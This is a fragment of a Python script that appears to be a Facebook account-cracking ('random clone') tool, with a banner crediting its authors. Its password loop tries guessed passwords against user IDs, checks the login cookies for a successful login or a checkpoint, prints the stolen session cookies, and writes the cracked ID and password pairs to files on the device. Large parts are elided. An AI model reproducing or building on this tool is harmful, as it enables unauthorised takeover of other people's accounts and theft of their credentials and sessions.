...
logo = ("""\033[1;37m
  ...
  __  __ _____ _____             ______ __   __           _____  _____ ______ _____ _   _ 
 |  \/  |_   _|  __ \     /\    |___  / \ \ / /     /\   |  __ \|_   _|  ____|_   _| \ | |
 | \  / | | | | |__) |   /  \      / /   \ V /     /  \  | |__) | | | | |__    | | |  \| |
 | |\/| | | | |  _  /   / /\ \    / /     > <     / /\ \ |  _  /  | | |  __|   | | | . ` |
 | |  | |_| |_| | \ \  / ____ \  / /__   / . \   / ____ \| | \ \ _| |_| |     _| |_| |\  |
 |_|  |_|_____|_|  \_\/_/    \_\/_____| /_/ \_\ /_/    \_\_|  \_\_____|_|    |_____|_| \_|
...
[] TOOLS     : RANDOM CLONE
[] TYPE      : TEST
[] FACEBOOK  : MIRAZ BRO & ARIFIN X MEME
[] WHATSAPP  : [UPDATING]
==================================================""")
...
def fuck():
    ...
    print(' [+] OK Ids saved in ARIXMIRU/OK.txt')
    print(' [+] CP Ids saved in ARIXMIRU/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[6T9]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[6T9-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/ARIXMIRU/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[ARIXMIRU-CP] {cid}|{ps}")
                open('/sdcard/ARIXMIRU-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
